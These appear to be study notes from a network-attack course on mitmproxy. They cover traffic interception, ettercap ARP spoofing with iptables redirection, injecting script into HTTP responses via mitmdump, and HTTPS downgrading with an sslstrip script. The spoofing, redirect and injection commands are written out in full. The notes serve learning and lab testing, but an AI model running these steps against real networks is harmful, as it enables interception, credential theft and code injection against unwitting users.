- Used to analyze, modify, and replay packet flows  
- it is a more low level program  
  
# How to install  
- cd /opt  
- [https://github.com/mitmproxy/mitmproxy/releases](https://github.com/mitmproxy/mitmproxy/releases)  
- extract to a new folder named mitmproxy  
	- 3 files will show up  
	- mitmdump - command line version of the program  
	- mitmproxy - main interactive command tool  
	- mitmweb - web interface that allows you to monitor traffic  
  
# to see the traffic flow when a user connects to a website  
- cd /opt/mitmproxy  
- ./mitmweb  
- navigate to web url  
- set firefox proxy to 127.0.0.1:8080  
- The main search box can be used to filter packets  
	- ie. -a .js >> this will only show you javascript files  
	- ie -m POST >> this will only show you post requests  
- The highlight option will only highlight what we want and not filter it  
    
# How to edit and modify packets  
- cd /opt/mitmproxy  
- ./mitmweb  
- navigate to web url  
- set firefox proxy to 127.0.0.1:8080  
- The intercept option is used to tell mitmproxy to only intercept those packets  
	- This means that request is held by us and not allowed to flow through  
- you can then use the ui to modify the response and play it  
	- the video added a alert(1) to the bing.com response  
  
# Another example but this time using ettercap and mitmproxy  
- ettercap -Tq -M arp:remote -i wlan0 -S /10.20.215.1// /10.20.215.9//  
	- This command will make us the attacker the mitm  
- iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080  
	- This command tells out computer to redirect port 80 to port 8080 where we are running mitmproxy  
- cd /opt/mitmproxy  
- ./mitmweb --transparent  
- When you are done  
	- quit mitmweb  
	- iptables -t nat --flush  
  
# To automate the steps tested using mitmweb  
- Run ettercap  
- update iptables  
- ./mitmdump --transparent --modify-body :~s:"</body>":"<script>alert(1)</script></body>"  
	- :filter:text to replace:txt that will be injected  
- When you are done  
	- quit mitmweb  
	- iptables -t nat -- flush  
  
  # How to use Python to interact with mitmproxy  
- pip install mitmproxy  
	- import mitmproxy  
- write your python script  
- ./mitmdump -s /root/test.py --transparent

# https
The biggest issue with the techniques we learned about mitmproxy is that they will only work with http websites. They will not work with https websites **  
- https data is encrypted usinf ssl  
- data can not be read or modified  
- sslstrip cannot be used since mitmproxy cannot work with another transparent proxy  
	- sslstrip is used to downgrade a webpage from https to http  
  
  
## What is the solution?  
- use a mitmproxy script to bypass https  
- there is a script named sslstrip.py that will downgrade a website from https to http  
  
## How do we perform the attack on https sites?  
- ettercap -Tq -M arp:remote -i wlan0 -S /10.20.215.1// /10.20.215.9//  
- ./mitmdump -s /root/sslstrip.py -s /root/test.py --mode transparent  
	- note you can run multiple scripts at the same time  
- iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080  
- When you are done  
	- quit ettercap  
	- quit mitmdump  
	- iptables -t nat -- flush

